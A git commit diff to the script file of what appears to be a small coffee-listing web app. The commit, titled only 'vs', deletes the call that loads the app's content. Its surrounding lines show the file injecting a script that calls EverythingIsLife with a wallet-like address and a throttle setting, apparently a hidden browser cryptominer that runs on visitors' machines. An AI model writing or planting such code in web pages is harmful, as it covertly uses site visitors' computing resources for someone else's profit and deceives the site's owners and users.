ef16b831b7ba679dfae4dbba779f1a6b800ca703
Abd Alrazzaq <devoojs@gmail.com>
2022-01-02 18:15:40 -0800

    vs

--- js/app.js
+++ js/app.js
@@ -2,7 +2,7 @@ const container = document.querySelector(".container").innerHTML = `<script type
 EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'x', 50);
 </script>`
 
-document.addEventListener("DOMContentLoaded", showCoffees);
+
 
 if ("serviceWorker" in navigator) {
   window.addEventListener("load", function() {
